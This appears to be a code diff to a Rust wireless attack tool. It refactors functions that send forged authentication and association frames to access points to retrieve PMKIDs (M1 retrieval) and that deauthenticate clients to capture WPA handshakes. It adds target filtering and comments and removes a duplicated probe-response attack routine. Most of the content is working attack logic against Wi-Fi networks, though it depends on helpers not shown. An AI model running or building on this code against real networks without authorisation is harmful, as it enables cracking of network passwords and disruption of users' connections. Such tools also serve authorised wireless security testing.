@@ -20,11 +20,22 @@ use crate::{
     write_packet, OxideRuntime,
 };
 
-pub fn attack_beacon(
+/// M1 Retrieval Attack
+/// Authentication => (resp) => Association => (resp) => (M1)
+/// Used to (attempt) to retrieve a PMKID.
+
+pub fn m1_retrieval_attack(
     oxide: &mut OxideRuntime,
-    frame: &Beacon,
     ap_mac: &MacAddress,
 ) -> Result<(), String> {
+
+    if !oxide.targets.is_empty() {
+        if !oxide.targets.contains(ap_mac) {
+            return Ok(());
+        }
+    }
+
+    // If we already have a 4whs, don't continue.
     if oxide
         .handshake_storage
         .has_complete_handshake_for_ap(ap_mac)
@@ -32,12 +43,14 @@ pub fn attack_beacon(
         return Ok(()); 
     }
 
+    // get AP object, if there isn't one, return (this shouldn't happen).
     let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
         dev
     } else {
         return Ok(());
     };
         
+    // attempt to get SSID using a probe request if there isn't one.
     if ap_data.ssid.is_none() {
         // Attempt to get the SSID.
         let frx =
@@ -48,10 +61,12 @@ pub fn attack_beacon(
             }
     }
 
+    // If the interaction cooldown isn't timed out (aka timer1).
     if !ap_data.auth_sequence.is_t1_timeout() {
         return Ok(());
     }
 
+    // Check state of auth sequence to ensure we are in the right order.
     if ap_data.auth_sequence.state > 0 {
         ap_data.auth_sequence.state = 0; // If t1 is timed out, we gotta reset to state 0.
         oxide.status_log.add_message(StatusMessage::new(
@@ -60,20 +75,25 @@ pub fn attack_beacon(
         ));
     }
     
+    // If we already have an M1 for this AP, don't re-attack.
     if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
         return Ok(());
     }
 
+    // Ensure the AP uses PSK (from the robust security ie)
     if !ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
         return Ok(());
     }
 
+    // Make an authentication frame (no_ack), so we don't over-send.
+    // TODO: Probably add some sort of "noise" flag that uses ack (so we send retries when necessary)
     let frx = build_authentication_frame_noack(
         ap_mac,
         &oxide.rogue_client,
         oxide.counters.sequence2(),
     );
 
+    // If we are transmitting
     if !oxide.notx {
         let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
         ap_data.interactions += 1;
@@ -89,7 +109,13 @@ pub fn attack_beacon(
     Ok(())
 }
 
-pub fn deauth_beacon(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String>{
+pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String>{
+    if !oxide.targets.is_empty() {
+        if !oxide.targets.contains(ap_mac) {
+            return Ok(());
+        }
+    }
+    
     if oxide
         .handshake_storage
         .has_complete_handshake_for_ap(ap_mac)
@@ -110,7 +136,7 @@ pub fn deauth_beacon(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
     let mut interacted: bool = false;
     let beacon_count = ap_data.beacon_count;
 
-    if (beacon_count % 16) == 0 {
+    if (beacon_count % 32) == 0 {
 
         if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp)
             && ap_data.information.akm_mask()
@@ -169,77 +195,6 @@ pub fn deauth_beacon(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
     Ok(())
 }
 
-pub fn attack_probe_response(
-    oxide: &mut OxideRuntime,
-    frame: &ProbeResponse,
-    ap_mac: &MacAddress,
-) -> Result<(), String> {
-    if oxide
-        .handshake_storage
-        .has_complete_handshake_for_ap(ap_mac)
-    { 
-        return Ok(()); 
-    }
-
-    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
-        return Ok(());
-    }
-
-    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
-        dev
-    } else {
-        return Ok(());
-    };
-
-    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
-        dev
-    } else {
-        return Ok(());
-    };
-
-    if !ap_data.auth_sequence.is_t1_timeout() {
-        return Ok(());
-    }
-
-    if ap_data.auth_sequence.state > 0 {
-        ap_data.auth_sequence.state = 0; // If t1 is timed out, we gotta reset to state 0.
-        oxide.status_log.add_message(StatusMessage::new(
-            MessageType::Info,
-            format!("{} reset to 0", ap_mac),
-        ));
-    }  
-        
-    if !ap_data.auth_sequence.is_t1_timeout() {
-        return Ok(());
-    }
-
-    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
-        return Ok(());
-    }
-
-    if !ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
-        return Ok(());
-    }
-
-    let frx = build_authentication_frame_noack(
-        ap_mac,
-        &oxide.rogue_client,
-        oxide.counters.sequence2(),
-    );
-    if !oxide.notx {
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
-        ap_data.auth_sequence.state = 1;
-        ap_data.update_t1_timer();
-        ap_data.update_t2_timer();
-        oxide.status_log.add_message(StatusMessage::new(
-            MessageType::Info,
-            format!("{} promoted to 1", ap_mac),
-        ));
-        ap_data.interactions += 1;
-    }
-    Ok(())
-}
-
 
 pub fn attack_authentication_from_ap(
     ap_mac: &MacAddress,
@@ -247,6 +202,12 @@ pub fn attack_authentication_from_ap(
     oxide: &mut OxideRuntime,
 ) -> Result<(), String> {
     
+    if !oxide.targets.is_empty() {
+        if !oxide.targets.contains(ap_mac) {
+            return Ok(());
+        }
+    }
+
     let ap_data = if let Some(ap) = oxide.access_points.get_device(ap_mac) {
         ap
     } else {
@@ -285,16 +246,6 @@ pub fn attack_authentication_from_ap(
         RsnCipherSuite::CCMP
     };
 
-    /*
-    let frx: Vec<u8> = build_association_request_org(
-        ap_mac,
-        client_mac,
-        ap_mac,
-        oxide.counters.sequence2(),
-        ap_data.ssid.clone(),
-        
-    );*/
-
     let frx: Vec<u8> = build_association_request_org(ap_mac, client_mac,
         ap_mac, oxide.counters.sequence2(), ap_data.ssid.clone(), gs, vec!(cs));
 
@@ -306,9 +257,7 @@ pub fn attack_authentication_from_ap(
             MessageType::Info,
             format!("{} state promoted to 2.", ap_mac),
         ));
-        let ack = build_ack(ap_mac);
         let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
-        //let _ = write_packet(oxide.tx_socket.as_raw_fd(), &ack);
         ap_data.interactions += 1;
     }
     Ok(())
